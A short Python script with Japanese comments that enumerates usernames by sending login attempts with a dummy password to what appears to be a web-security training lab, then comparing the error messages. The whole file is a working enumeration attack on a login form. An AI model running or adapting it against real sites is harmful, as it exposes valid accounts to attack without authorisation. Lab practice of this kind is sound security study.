import requests
import re

URL = "https://0ab800b004ada1ab80a2909700c20046.web-security-academy.net/login"

with open("users.txt", "r") as f:
    usernames = f.read().splitlines()

print("[*] ユーザー名の列挙（Enumeration）を開始します！")



for username in usernames:
    data = {
        "username": username,
        "password": "DummyPassword123!"
    }
    
    # SessionもCSRFトークンも不要です！シンプルにPOSTを撃ち込みます！
    response = requests.post(URL, data=data)
    
    # HTMLから、エラーメッセージのテキスト部分だけを正規表現で抽出します！
    error_match = re.search(r'<p class="is-warning">(.*?)</p>', response.text)
    
    error_msg = error_match.group(1) if error_match else "エラーなし"
    
    print(f"ユーザー名: {username:15} | エラー内容: {error_msg}")